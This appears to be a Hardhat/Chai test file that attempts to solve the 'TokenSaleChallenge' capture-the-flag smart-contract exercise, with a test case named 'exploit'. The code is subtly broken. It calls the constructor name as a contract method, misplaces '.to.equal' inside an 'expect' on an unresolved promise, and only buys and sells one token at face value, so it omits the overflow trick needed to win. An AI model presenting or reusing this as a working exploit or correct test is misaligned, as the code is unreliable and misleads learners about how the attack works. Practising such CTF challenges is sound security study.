import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed(); 

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const setToken = await target.connect(attacker).TokenSaleChallenge(attacker,{value: utils.parseEther('1')});
    const buyIng = await target.connect(attacker).buy(1,{value: utils.parseEther('1')});

    await buyIng.wait();

    expect(await target.balanceOf(attacker.address).to.equal(1));

    const selling = await target.connect(attacker).sell(1);
    await selling.wait();


    expect(await target.isComplete()).to.equal(true);
  });
});
